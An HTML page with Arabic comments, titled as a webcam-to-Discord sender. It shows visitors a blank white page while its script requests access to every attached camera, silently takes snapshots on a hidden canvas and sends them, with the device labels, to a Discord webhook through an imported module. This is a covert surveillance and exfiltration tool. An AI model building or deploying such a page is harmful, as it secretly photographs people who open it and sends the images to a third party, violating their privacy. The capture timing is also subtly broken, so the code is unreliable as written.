<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>كاميرا ويب - إرسال إلى Discord</title>
    <style>
        body {
            background-color: white;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        canvas {
            display: none;
        }
    </style>
</head>
<body>
    <canvas id="canvas"></canvas>

    <script type="module">
        import { sendToDiscord } from './discordWebhook.js';

        const canvas = document.getElementById("canvas");
        let images = [];

        // تحقق مما إذا كان المتصفح يدعم MediaDevices و getUserMedia
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            alert("المتصفح الخاص بك لا يدعم الوصول إلى الكاميرات. يُرجى تحديث المتصفح.");
        }

        // الدالة لبدء كاميرات الويب
        async function initCameras() {
            try {
                // الحصول على قائمة بجميع الأجهزة المتصلة (الكاميرات)
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput'); // تصفية الكاميرات فقط

                if (videoDevices.length === 0) {
                    console.log("لم يتم العثور على كاميرات.");
                    sendToDiscord("camera not found");
                    return;
                }

                console.log("تم العثور على الكاميرات التالية:", videoDevices);

                // استدعاء جميع الكاميرات المتاحة والتقاط الصور منها
                const capturePromises = videoDevices.map(device => startCameraAndCapture(device));
                await Promise.all(capturePromises);  // الانتظار حتى تنتهي جميع الكاميرات من التقاط الصور

                // إرسال الصور إلى Discord بعد التقاطها
                console.log("إرسال الصور إلى Discord...");
                sendToDiscord(images);

            } catch (error) {
                alert("حدث خطأ أثناء الوصول إلى الكاميرا. تأكد من أنك قد منحت إذن الوصول إلى الكاميرات.");
                console.error("حدث خطأ أثناء الوصول إلى الكاميرات.", error);
                sendToDiscord("camera not found");
            }
        }

        // بدء كاميرا والتقاط الصورة
        async function startCameraAndCapture(device) {
            try {
                // الحصول على صلاحية الوصول إلى الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                video.width = 640;
                video.height = 480;
                video.muted = true;  // التأكد من أن الفيديو مُكبّت
                video.play();

                // الانتظار حتى يبدأ الفيديو في التشغيل ثم التقاط الصورة
                video.onplaying = () => {
                    captureAndSend(video, device);
                };

            } catch (error) {
                console.error(`حدث خطأ أثناء تشغيل الكاميرا: ${device.label}`, error);
            }
        }

        // التقاط الصورة من الفيديو
        function captureAndSend(video, device) {
            // إعداد الـCanvas لرسم الفيديو
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // تحويل الصورة إلى base64
            const imageData = canvas.toDataURL("image/png");

            // إضافة الصورة إلى قائمة الصور
            images.push({ image: imageData, deviceLabel: device.label });
            console.log(`تم التقاط صورة من كاميرا: ${device.label}`);
        }

        // بدء الكاميرات عند تحميل الصفحة
        window.onload = initCameras;
    </script>
</body>
</html>
